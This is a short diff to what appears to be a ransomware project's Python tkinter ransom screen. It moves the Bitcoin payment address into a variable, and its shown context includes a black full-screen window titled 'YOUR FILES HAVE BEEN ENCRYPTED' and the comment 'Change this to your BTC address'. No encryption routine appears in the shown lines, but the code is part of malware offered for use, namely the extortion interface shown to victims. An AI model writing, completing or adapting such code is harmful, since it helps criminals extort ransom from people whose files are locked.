@@ -114,6 +114,8 @@ def spam_messagebox():
     canvas1 = tk.Canvas(root, width = width, height = height, bg='black') # Main window
     canvas1.pack()
 
+    BTC_ADDRESS = "YOUR_BTC_ADDRESS_HERE"
+
     label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED') # Title
     label1.config(font=('helvetica', int(height/20)))
     label1.config(background='black', foreground='red')
@@ -150,7 +152,7 @@ def spam_messagebox():
     canvas1.create_window(int(width/2), int(height/20)*11, window=label1)
 
     
-    labelBTC = tk.Label(root, text=f'YOUR_BTC_ADDRESS_HERE') # Change this to your BTC address
+    labelBTC = tk.Label(root, text=f"{BTC_ADDRESS}") # Change this to your BTC address
     labelBTC.config(font=('helvetica', int(height/50))) # Size
     labelBTC.config(background='black', foreground='red') # Colors
     canvas1.create_window(int(width/2), int(height/20)*13, window=labelBTC)
